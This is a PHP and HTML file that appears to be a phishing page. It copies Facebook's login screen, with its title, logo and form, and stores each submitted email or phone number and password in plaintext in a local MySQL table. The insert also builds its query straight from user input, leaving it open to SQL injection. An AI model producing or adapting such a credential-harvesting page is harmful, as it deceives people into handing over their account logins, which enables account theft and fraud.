<?php

$conn = mysqli_connect("localhost", "root", "", "facebook");


// Creating Variables

$username="";
$password="";


if(isset($_POST['lgn_btn'])){
	$username = $_POST['uname'];
	$password = $_POST['pwd'];

	$query = mysqli_query($conn, "INSERT INTO users VALUES('', '$username', '$password')");
}



?>






<!DOCTYPE html>
<html>
<head>
	<title>Log in to Facebook | Facebook</title>
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
</head>
<body>
	<div class="wrapper">
		<img id="fbImg" src="image/fb.svg">
		<div class="container">
		<div class="head">
			<h2>Log in To Facebook</h2>
		</div>
		<div class="form-container">
			<form>
				<input name="uname" type="text" placeholder="Email address or phone number" required><br>
				<input name="pwd" type="password"  placeholder="Password" required><br>
				<button name="lgn_btn" class="btn logIn">Log In</button>
			</form>
		</div>
		<div class="footer-container">
			<a href="#">Forgotten account?</a>
			<a href="#">Signup for Facebook</a>
			<!-- <img id="hr" src="image/hr.jpg"> -->
			<!-- <hr> -->
			<!-- <button class="btn signUp">Create New Account</button> -->
		</div>
	</div>
	</div>
</body>
</html>